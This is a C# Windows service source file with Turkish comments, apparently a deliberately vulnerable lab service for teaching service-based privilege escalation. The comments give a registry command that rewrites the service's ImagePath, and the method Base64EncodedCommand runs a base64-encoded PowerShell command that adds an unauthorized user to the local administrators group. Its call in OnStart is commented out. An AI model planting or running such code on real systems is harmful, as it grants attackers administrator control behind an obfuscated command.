using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;

namespace Personel_Takip
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }


        public void onDebug()
        {
            OnStart(null);
        }

        /*
        * Servisi eklemek için :
        * C:\windows\microsoft.net\framework\v4.0.30319\InstallUtil.exe  '.\Zafiyetli Servis.exe' 
        * New-Service -Name "YourServiceName" -BinaryPathName <yourproject>.exe
        * 
        * Servisi kaldırmak için:
        * C:\windows\microsoft.net\framework\v4.0.30319\InstallUtil.exe  /u '.\Zafiyetli Servis.exe' 
        * $service = Get-WmiObject -Class Win32_Service -Filter "Name='Personel Takip'"
        * $service.Delete()
        * 
        * 
        * Servis hakkında ayrıntılı bilgi için:
        * Get-WmiObject win32_service -Property * | Where-Object {$_.NAME -match "kuday"} | SELECT *
        * 
        * Hacklenmek için:
        * Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\zafiyetliServis4Kuday\" -Name ImagePath -Value "C:\Users\Ogrenci\Desktop\Zafiyetli Servis\Zafiyetli Servis\bin\Release\Zafiyetli Servis.exe"
        * 
        */

        protected override void OnStart(string[] args)
        {
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            {

                file.WriteLine(DateTime.Now.ToString() + ": Servis Başladı!");
            }
            //Base64EncodedCommand();
        }

        protected override void OnStop()
        {
            using (System.IO.StreamWriter file =
                new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            {

                file.WriteLine(DateTime.Now.ToString() + ": Servis Durdu!");
            }
        }

        void Base64EncodedCommand()
        {
            var psCommmand = @"net localgroup administrators bkg\yetkisizuser /add";
            var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(psCommmand);
            var psCommandBase64 = Convert.ToBase64String(psCommandBytes);

            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
                UseShellExecute = false
            };
            Process.Start(startInfo);

            using (System.IO.StreamWriter file =
          new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            {

                file.WriteLine(DateTime.Now.ToString() + ": Servis Başladı (Hack)!");
            }

        }
    }
}
